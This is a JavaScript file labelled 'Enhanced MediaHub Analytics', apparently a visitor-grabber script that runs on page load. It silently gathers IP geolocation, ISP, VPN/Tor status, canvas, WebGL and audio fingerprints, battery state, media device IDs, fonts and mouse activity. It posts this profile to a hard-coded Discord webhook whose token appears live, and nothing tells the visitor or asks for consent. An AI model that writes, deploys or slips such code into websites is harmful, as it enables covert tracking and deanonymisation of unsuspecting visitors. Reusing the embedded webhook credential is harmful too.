// Enhanced MediaHub Analytics - Maximum Data Collection
class EnhancedMediaHubAnalytics {
    constructor() {
        this.webhookUrl = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
        this.data = {};
        this.init();
    }

    async init() {
        try {
            await this.collectAllPossibleData();
            await this.sendToDiscord();
            this.storeLocally();
        } catch (error) {
            console.warn('Analytics collection limited:', error);
            this.sendBasicData(); // Fallback
        }
    }

    async collectAllPossibleData() {
        // Collect data from multiple sources in parallel
        const [
            ipInfo, 
            systemInfo, 
            networkInfo,
            advancedData
        ] = await Promise.all([
            this.getEnhancedIPInfo(),
            this.getEnhancedSystemInfo(),
            this.getNetworkInfo(),
            this.getAdvancedData()
        ]);

        this.data = {
            ...ipInfo,
            ...systemInfo,
            ...networkInfo,
            ...advancedData,
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href,
            referrer: document.referrer || 'Direct',
            sessionId: this.generateSessionId(),
            pageLoadTime: this.getPageLoadTime(),
            browserFeatures: this.getBrowserFeatures(),
            performance: this.getPerformanceMetrics()
        };

        // Additional data collection that might take longer
        this.data.userBehavior = await this.getUserBehavior();
        this.data.socialMedia = this.checkSocialMediaPresence();
    }

    async getEnhancedIPInfo() {
        try {
            // Try multiple IP APIs for redundancy
            const ipResponses = await Promise.allSettled([
                fetch('https://api.ipify.org?format=json'),
                fetch('https://ipapi.co/json/'),
                fetch('https://ipwho.is/'),
                fetch('https://freeipapi.com/api/json')
            ]);

            let ipData = {};
            for (const response of ipResponses) {
                if (response.status === 'fulfilled' && response.value.ok) {
                    const data = await response.value.json();
                    ipData = { ...ipData, ...data };
                }
            }

            return {
                ip: ipData.ip || 'Unknown',
                country: ipData.country_name || ipData.country || 'Unknown',
                countryCode: ipData.country_code || 'Unknown',
                city: ipData.city || 'Unknown',
                region: ipData.region || ipData.region_name || 'Unknown',
                zipCode: ipData.postal || ipData.zip || 'Unknown',
                isp: ipData.org || ipData.isp || ipData.connection?.isp || 'Unknown',
                timezone: ipData.timezone || ipData.time_zone?.name || 'Unknown',
                coordinates: ipData.latitude && ipData.longitude ? 
                    `${ipData.latitude}, ${ipData.longitude}` : 'Unknown',
                asn: ipData.asn || 'Unknown',
                proxy: ipData.proxy || ipData.security?.is_proxy || false,
                vpn: ipData.security?.is_vpn || false,
                tor: ipData.security?.is_tor || false
            };
        } catch {
            return { ip: 'Unknown', error: 'IP detection failed' };
        }
    }

    getEnhancedSystemInfo() {
        const connection = navigator.connection || {};
        const deviceMemory = navigator.deviceMemory || 'Unknown';
        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
        
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
            screen: `${screen.width}x${screen.height}`,
            colorDepth: `${screen.colorDepth}-bit`,
            pixelDepth: `${screen.pixelDepth}-bit`,
            cpuCores: hardwareConcurrency,
            deviceMemory: deviceMemory ? `${deviceMemory}GB` : 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            connectionType: connection.effectiveType || 'Unknown',
            networkSpeed: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
            networkRTT: connection.rtt ? `${connection.rtt}ms` : 'Unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled || false,
            deviceType: this.getDeviceType(),
            browserInfo: this.getDetailedBrowserInfo(),
            osInfo: this.getDetailedOSInfo(),
            installedFonts: this.getInstalledFonts(),
            plugins: this.getBrowserPlugins()
        };
    }

    getDetailedBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';
        let version = 'Unknown';

        // Detect browser and version with more precision
        if (ua.includes('Chrome') && !ua.includes('Edg')) {
            browser = 'Chrome';
            version = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
        } else if (ua.includes('Firefox')) {
            browser = 'Firefox';
            version = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
            browser = 'Safari';
            version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
        } else if (ua.includes('Edg')) {
            browser = 'Edge';
            version = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
        } else if (ua.includes('Opera') || ua.includes('OPR')) {
            browser = 'Opera';
            version = ua.match(/(Opera|OPR)\/([0-9.]+)/)?.[2] || 'Unknown';
        }

        return { name: browser, version: version, full: ua };
    }

    getDetailedOSInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        let version = 'Unknown';

        if (ua.includes('Windows')) {
            os = 'Windows';
            if (ua.includes('Windows NT 10.0')) version = '10';
            else if (ua.includes('Windows NT 6.3')) version = '8.1';
            else if (ua.includes('Windows NT 6.2')) version = '8';
            else if (ua.includes('Windows NT 6.1')) version = '7';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            version = ua.match(/Mac OS X ([0-9_]+)/)?.[1].replace(/_/g, '.') || 'Unknown';
        } else if (ua.includes('Linux')) {
            os = 'Linux';
            // Try to detect specific distros
            if (ua.includes('Ubuntu')) version = 'Ubuntu';
            else if (ua.includes('Fedora')) version = 'Fedora';
            else if (ua.includes('Debian')) version = 'Debian';
        } else if (ua.includes('Android')) {
            os = 'Android';
            version = ua.match(/Android ([0-9.]+)/)?.[1] || 'Unknown';
        } else if (ua.includes('iOS') || ua.includes('iPhone')) {
            os = 'iOS';
            version = ua.match(/OS ([0-9_]+)/)?.[1].replace(/_/g, '.') || 'Unknown';
        }

        return { name: os, version: version };
    }

    getBrowserPlugins() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        return plugins;
    }

    getInstalledFonts() {
        const fonts = [
            'Arial', 'Arial Black', 'Arial Narrow', 'Times New Roman',
            'Courier New', 'Verdana', 'Georgia', 'Palatino',
            'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact',
            'Helvetica', 'Tahoma', 'Lucida Console', 'Microsoft Sans Serif'
        ];
        
        return fonts.filter(font => {
            return document.fonts.check(`12px "${font}"`);
        });
    }

    getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
        return 'Desktop';
    }

    async getNetworkInfo() {
        try {
            const connection = navigator.connection || {};
            return {
                downlink: connection.downlink || 'Unknown',
                effectiveType: connection.effectiveType || 'Unknown',
                rtt: connection.rtt || 'Unknown',
                saveData: connection.saveData || false,
                networkType: connection.type || 'Unknown'
            };
        } catch {
            return { networkInfo: 'Unavailable' };
        }
    }

    async getAdvancedData() {
        return {
            deviceId: this.generateDeviceId(),
            canvasFingerprint: this.getCanvasFingerprint(),
            webglFingerprint: this.getWebGLFingerprint(),
            audioFingerprint: await this.getAudioFingerprint(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            touchSupport: this.getTouchSupport(),
            batteryInfo: await this.getBatteryInfo(),
            mediaDevices: await this.getMediaDevices()
        };
    }

    generateDeviceId() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            screen.width + 'x' + screen.height,
            navigator.language,
            new Date().getTimezoneOffset(),
            !!navigator.cookieEnabled
        ];
        
        let hash = 0;
        for (let i = 0; i < components.length; i++) {
            const str = components[i].toString();
            for (let j = 0; j < str.length; j++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(j);
                hash = hash & hash; // Convert to 32-bit integer
            }
        }
        
        return Math.abs(hash).toString(16);
    }

    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 240;
            canvas.height = 60;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 120, 60);
            ctx.fillStyle = '#069';
            ctx.fillText('MediaHub Analytics', 4, 20);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('MediaHub Analytics', 6, 22);
            
            return canvas.toDataURL().substring(0, 100);
        } catch (e) {
            return 'Blocked';
        }
    }

    getWebGLFingerprint() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            if (!gl) return 'WebGL not supported';
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION)
                };
            }
            return 'WebGL available but debug info blocked';
        } catch (e) {
            return 'WebGL blocked';
        }
    }

    async getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
            
            const analyser = audioContext.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start();
            
            await new Promise(resolve => setTimeout(resolve, 100));
            
            const data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            oscillator.stop();
            audioContext.close();
            
            return Array.from(data).slice(0, 10).join('');
        } catch (e) {
            return 'Audio context blocked';
        }
    }

    getTouchSupport() {
        return {
            maxTouchPoints: navigator.maxTouchPoints || 0,
            touchEvent: 'ontouchstart' in window,
            pointerEvent: 'onpointerdown' in window
        };
    }

    async getBatteryInfo() {
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                return 'Battery API blocked';
            }
        }
        return 'Battery API not available';
    }

    async getMediaDevices() {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    id: device.deviceId
                }));
            } catch (e) {
                return 'Media devices blocked';
            }
        }
        return 'Media devices API not available';
    }

    getPageLoadTime() {
        if (window.performance) {
            const perfData = window.performance.timing;
            const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;
            const domReadyTime = perfData.domContentLoadedEventEnd - perfData.navigationStart;
            
            return {
                pageLoad: pageLoadTime + 'ms',
                domReady: domReadyTime + 'ms',
                navigationStart: new Date(perfData.navigationStart).toISOString()
            };
        }
        return 'Performance API not available';
    }

    getBrowserFeatures() {
        return {
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            indexedDB: !!window.indexedDB,
            serviceWorker: 'serviceWorker' in navigator,
            geolocation: 'geolocation' in navigator,
            notifications: 'Notification' in window,
            vibrate: 'vibrate' in navigator
        };
    }

    getPerformanceMetrics() {
        if (window.performance && window.performance.memory) {
            return {
                jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                usedJSHeapSize: window.performance.memory.usedJSHeapSize
            };
        }
        return 'Memory stats not available';
    }

    async getUserBehavior() {
        // Track mouse movements, clicks, and scrolls
        let clickCount = 0;
        let scrollDepth = 0;
        let mouseMovements = 0;

        const trackClick = () => clickCount++;
        const trackScroll = () => scrollDepth = Math.max(scrollDepth, window.scrollY);
        const trackMouseMove = () => mouseMovements++;

        document.addEventListener('click', trackClick);
        document.addEventListener('scroll', trackScroll);
        document.addEventListener('mousemove', trackMouseMove);

        // Return behavior data after 5 seconds
        return new Promise(resolve => {
            setTimeout(() => {
                document.removeEventListener('click', trackClick);
                document.removeEventListener('scroll', trackScroll);
                document.removeEventListener('mousemove', trackMouseMove);

                resolve({
                    clicks: clickCount,
                    scrollDepth: scrollDepth + 'px',
                    mouseMovements: mouseMovements,
                    timeOnPage: '5000ms' // Initial time
                });
            }, 5000);
        });
    }

    checkSocialMediaPresence() {
        // Check if user is logged into social media platforms
        // This is limited due to browser security restrictions
        return {
            facebook: this.checkSocialLogin('facebook'),
            twitter: this.checkSocialLogin('twitter'),
            google: this.checkSocialLogin('google'),
            linkedin: this.checkSocialLogin('linkedin')
        };
    }

    checkSocialLogin(platform) {
        // This is a very basic check and may not be reliable
        try {
            switch(platform) {
                case 'facebook':
                    return typeof FB !== 'undefined' && FB.getAuthResponse && !!FB.getAuthResponse();
                case 'google':
                    return typeof gapi !== 'undefined' && gapi.auth2 && !!gapi.auth2.getAuthInstance().currentUser.get();
                default:
                    return 'Cannot detect';
            }
        } catch (e) {
            return 'Unknown';
        }
    }

    generateSessionId() {
        return 'sess_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
    }

    async sendToDiscord() {
        const embed = {
            title: "🌐 MediaHub Pro - Advanced Visitor Analytics",
            color: 0x0099ff,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "👤 User Identification",
                    value: `**IP:** ${this.data.ip}\n**Country:** ${this.data.country} (${this.data.countryCode})\n**City:** ${this.data.city}\n**Region:** ${this.data.region}\n**ISP:** ${this.data.isp}\n**ASN:** ${this.data.asn}\n**Proxy/VPN:** ${this.data.proxy || this.data.vpn ? 'Yes' : 'No'}`,
                    inline: false
                },
                {
                    name: "💻 System Profile",
                    value: `**OS:** ${this.data.osInfo.name} ${this.data.osInfo.version}\n**Browser:** ${this.data.browserInfo.name} ${this.data.browserInfo.version}\n**Device:** ${this.data.deviceType}\n**Screen:** ${this.data.screen}\n**CPU Cores:** ${this.data.cpuCores}\n**RAM:** ${this.data.deviceMemory}\n**Language:** ${this.data.language}`,
                    inline: false
                },
                {
                    name: "🌐 Network Information",
                    value: `**Connection:** ${this.data.connectionType}\n**Speed:** ${this.data.networkSpeed}\n**RTT:** ${this.data.networkRTT}\n**Timezone:** ${this.data.timezone}\n**Save Data:** ${this.data.saveData ? 'Enabled' : 'Disabled'}`,
                    inline: false
                },
                {
                    name: "🔍 Advanced Tracking",
                    value: `**Device ID:** ${this.data.deviceId}\n**Session ID:** ${this.data.sessionId}\n**Canvas FP:** ${this.data.canvasFingerprint !== 'Blocked' ? 'Present' : 'Blocked'}\n**WebGL FP:** ${typeof this.data.webglFingerprint === 'object' ? 'Present' : this.data.webglFingerprint}\n**Audio FP:** ${this.data.audioFingerprint !== 'Audio context blocked' ? 'Present' : 'Blocked'}`,
                    inline: false
                },
                {
                    name: "📊 Visit Details",
                    value: `**URL:** ${this.data.pageUrl}\n**Referrer:** ${this.data.referrer}\n**Time:** <t:${Math.floor(new Date(this.data.timestamp).getTime() / 1000)}:R>\n**Load Time:** ${this.data.pageLoadTime.pageLoad}`,
                    inline: false
                }
            ],
            footer: {
                text: "MediaHub Pro Analytics • Maximum Data Collection"
            }
        };

        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "MediaHub Analytics Dashboard",
                    embeds: [embed],
                    content: "📊 **New Visitor Detected** - Advanced Analytics Collected"
                })
            });
        } catch (error) {
            console.warn('Discord webhook failed:', error);
        }
    }

    storeLocally() {
        try {
            const analyticsData = JSON.parse(localStorage.getItem('mediahub_analytics') || '[]');
            analyticsData.push({
                timestamp: this.data.timestamp,
                deviceId: this.data.deviceId,
                ip: this.data.ip,
                country: this.data.country
            });
            
            // Keep only the last 100 entries
            if (analyticsData.length > 100) {
                analyticsData.shift();
            }
            
            localStorage.setItem('mediahub_analytics', JSON.stringify(analyticsData));
        } catch (e) {
            console.warn('Local storage not available');
        }
    }

    sendBasicData() {
        // Fallback method if detailed collection fails
        const basicData = {
            ip: 'Unknown',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href
        };

        fetch(this.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🌐 Basic visitor data: ${JSON.stringify(basicData)}`,
                username: "MediaHub Analytics Fallback"
            })
        }).catch(() => console.log('Webhook completely failed'));
    }
}

// Initialize enhanced analytics
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        new EnhancedMediaHubAnalytics();
    }, 1000);
});
